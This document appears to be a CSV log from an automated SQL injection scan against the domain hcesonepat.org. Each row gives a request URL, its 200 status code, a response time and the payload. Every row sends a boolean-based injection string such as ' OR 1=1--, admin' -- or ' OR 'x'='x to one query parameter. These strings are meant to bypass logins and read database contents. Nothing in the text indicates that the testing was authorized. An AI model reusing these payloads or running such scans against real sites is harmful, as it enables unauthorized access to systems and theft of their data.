URL,Status Code,Response Time (s),Payload
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.8764593601226807,' OR 1=1#
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.2701447010040283,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.2736811637878418,' OR 1=1 --
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.25907063484191895,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.2598576545715332,' OR 1=1#
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.2751631736755371,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.29514455795288086,admin' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,1.922441005706787,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.2425613403320312,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.8146498203277588,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.8094475269317627,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,1.8969717025756836,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.2236506938934326,' OR 'x'='x
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.7854471206665039,admin' --
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,1.870265245437622,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,1.1912028789520264,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.7678196430206299,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.7967090606689453,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,1.1171674728393555,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.7632966041564941,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.1312506198883057,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.8913993835449219,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.35448765754699707,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.8457200527191162,' OR 'x'='x
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.31557512283325195,' OR 1=1--
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.341172456741333,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.6480050086975098,' OR 'x'='x
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.8488397598266602,' OR 1=1#
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.8332023620605469,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.31685853004455566,' OR 1=1#
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.3091590404510498,admin' --
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.3417372703552246,admin' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.3339574337005615,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.8096239566802979,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.8164162635803223,1 OR 1=1
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.8413958549499512,admin' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.7614030838012695,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=admin%27%20--,200,1.2982423305511475,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.7053499221801758,admin' #
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,1.2850456237792969,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.6932399272918701,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.278414249420166,1 OR 1=1
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.6373155117034912,admin' #
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,1.1991863250732422,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.8324398994445801,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.2194056510925293,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.21705102920532227,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.2203974723815918,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,1.9991652965545654,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,1.1356086730957031,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.7632458209991455,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.21867084503173828,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.22936415672302246,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.2347123622894287,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=admin%27%20--,200,1.2080793380737305,admin' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.8178119659423828,' OR 'x'='x
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,1.2072815895080566,' OR 1=1#
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.5917706489562988,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.7403550148010254,admin' #
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.9916565418243408,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.9930393695831299,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.2755913734436035,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.2813751697540283,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.8647511005401611,admin' OR '1'='1
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.8857765197753906,admin' #
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.7976696491241455,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,2.0279505252838135,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,1.2418608665466309,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.8268697261810303,admin' #
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.2753739356994629,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.30959367752075195,1 OR 1=1
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.29255008697509766,admin' #
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.7479772567749023,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,1.9527976512908936,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.732262134552002,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.9495265483856201,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,1.135521411895752,' OR 1=1#
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.6686222553253174,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.7202029228210449,1 OR 1=1
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.8805160522460938,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.875610113143921,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.24965739250183105,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.2488844394683838,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,1.315314531326294,' OR 1=1#
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.6741909980773926,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,1.3223142623901367,' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.22997283935546875,' OR 1=1#
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.7620646953582764,admin' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.25731778144836426,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.25414347648620605,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.2871253490447998,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.2745015621185303,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.28615403175354,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.7715604305267334,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.6988019943237305,' OR 1=1 --
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,1.284559965133667,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.7787520885467529,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.7113776206970215,1 OR 1=1
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.5978379249572754,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.5988931655883789,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.5988683700561523,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.5989539623260498,admin' --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.5822551250457764,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.28940868377685547,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.297163724899292,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.34578871726989746,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.3423881530761719,' OR 1=1#
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.43310070037841797,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.43755221366882324,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.43363451957702637,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.4287080764770508,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.43477797508239746,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.4357566833496094,1 OR 1=1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.41495323181152344,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.4074981212615967,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.5523777008056641,1 OR 1=1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.15612006187438965,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.14715242385864258,' OR 'x'='x
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.6798481941223145,admin' --
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.1906719207763672,' OR 1=1 --
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.20623469352722168,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.20769953727722168,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.9032111167907715,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.2404346466064453,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.892101526260376,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,1.1462619304656982,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.8001141548156738,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.2438371181488037,admin' #
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.8236818313598633,' OR 1=1 --
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.25121378898620605,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.7937185764312744,' OR 'x'='x
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.24664044380187988,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.4295470714569092,admin' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.2820167541503906,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.9346809387207031,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.267488956451416,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.2678060531616211,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.2699146270751953,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.2676372528076172,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.2666468620300293,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.9241344928741455,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.9105556011199951,' OR '1'='1
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.3858122825622559,admin' #
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.31775593757629395,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.32216644287109375,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.3229374885559082,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.3234982490539551,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.324129581451416,admin' #
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.32317662239074707,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.32555341720581055,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.8823645114898682,' OR 1=1--
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,1.9246466159820557,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,1.3557705879211426,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.8787429332733154,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.749946117401123,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.7541661262512207,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.756676197052002,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.7967071533203125,admin' --
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.5798473358154297,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.6186466217041016,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.7060356140136719,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.24107885360717773,' OR 1=1#
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.7637298107147217,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.9085164070129395,admin' --
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.79705810546875,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.7993669509887695,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.805720329284668,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.4423685073852539,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.4463040828704834,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.4505181312561035,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.44820642471313477,admin' #
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.8478138446807861,' OR 1=1--
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.8997156620025635,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.35655689239501953,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.4516112804412842,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.4641847610473633,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.7592372894287109,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.7635853290557861,' OR 1=1--
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.45612645149230957,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.4544341564178467,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.7619879245758057,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.8019826412200928,' OR 1=1--
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.7172820568084717,' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.6807119846343994,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,1.3477675914764404,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.7098851203918457,' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.731163740158081,' OR 1=1#
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.7556247711181641,admin' #
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.22707223892211914,admin' --
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.20302438735961914,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.2185041904449463,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.2187516689300537,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.2188575267791748,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.22423243522644043,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.7022190093994141,' OR 1=1--
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.28330159187316895,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.28150391578674316,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.6939182281494141,' OR 1=1#
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.5735032558441162,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.5854740142822266,' OR 1=1 --
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.6800382137298584,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.565723180770874,admin' #
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.5673737525939941,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.6760873794555664,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.7164602279663086,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.716496467590332,' OR '1'='1
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.2059164047241211,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.6425061225891113,' OR 1=1--
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.2019336223602295,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.20338058471679688,1 OR 1=1
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.2622799873352051,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.26363158226013184,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.2648429870605469,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.4369785785675049,' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.5366978645324707,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.6766736507415771,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,2.0695648193359375,' OR 1=1#
https://hcesonepat.org?boolean_based=admin%27%20--,200,1.5452804565429688,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.6757206916809082,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,2.066303014755249,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,1.5336804389953613,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.7076852321624756,' OR '1'='1
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,2.0409483909606934,admin' OR '1'='1
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.6579174995422363,1 OR 1=1
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.4035656452178955,admin' --
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,0.19911813735961914,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,1.4540283679962158,' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.6248142719268799,' OR 'x'='x
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.21453475952148438,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.21094036102294922,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.8272056579589844,admin' #
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.21154141426086426,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.18825578689575195,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,0.7457804679870605,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,0.5278952121734619,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,1.917424201965332,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,1.733036756515503,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,1.0736141204833984,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.9117157459259033,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.1514892578125,' OR 'x'='x
https://hcesonepat.org?boolean_based=1%20OR%201%3D1,200,1.1627707481384277,1 OR 1=1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%23,200,1.164405345916748,' OR 1=1#
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.21458029747009277,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,1.1504762172698975,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.2152419090270996,admin' #
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.1599678993225098,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,1.7069017887115479,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.9876391887664795,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.7869336605072021,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1--,200,0.27292728424072266,' OR 1=1--
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.27582859992980957,admin' --
https://hcesonepat.org?boolean_based=admin%27%20%23,200,0.9549798965454102,admin' #
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.23184561729431152,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,0.7792799472808838,' OR 'x'='x
https://hcesonepat.org?boolean_based=admin%27%20OR%20%271%27%3D%271,200,1.593656063079834,admin' OR '1'='1
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.7410638332366943,' OR 1=1 --
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.1655902862548828,admin' --
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.16707324981689453,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%271%27%3D%271,200,0.23938465118408203,' OR '1'='1
https://hcesonepat.org?boolean_based=1%27%20OR%20%271%27%3D%271%27%20--,200,0.514369010925293,1' OR '1'='1' --
https://hcesonepat.org?boolean_based=admin%27%20--,200,0.5127742290496826,admin' --
https://hcesonepat.org?boolean_based=%27%20OR%201%3D1%20--,200,0.15919137001037598,' OR 1=1 --
https://hcesonepat.org?boolean_based=%27%20OR%20%27x%27%3D%27x,200,1.7836451530456543,' OR 'x'='x
